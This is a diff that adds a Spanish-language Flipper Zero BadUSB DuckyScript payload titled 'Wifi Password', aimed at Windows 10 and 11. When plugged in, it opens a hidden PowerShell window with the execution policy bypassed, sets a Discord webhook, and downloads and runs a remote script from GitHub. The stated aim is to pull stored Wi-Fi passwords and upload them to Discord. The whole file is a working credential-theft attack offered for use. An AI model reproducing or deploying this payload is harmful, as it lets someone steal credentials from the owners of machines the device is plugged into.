@@ -1,0 +1,14 @@
+REM     Titulo: Wifi Password
+
+REM     Autor: GaspiN 
+
+REM     Descripcion: Version Española para FlipperZero_BAD-USB para recuperar las contraseñas wifi almacenadas y subirlas a un servidor Discord
+
+REM     Sistemas Operativos: Windows 10, 11
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXXXXXXX';irm https://raw.githubusercontent.com/g4spin/FlipperZero/main/WifiPass_FlipperZero.ps1 | iex
+ENTER
+
+
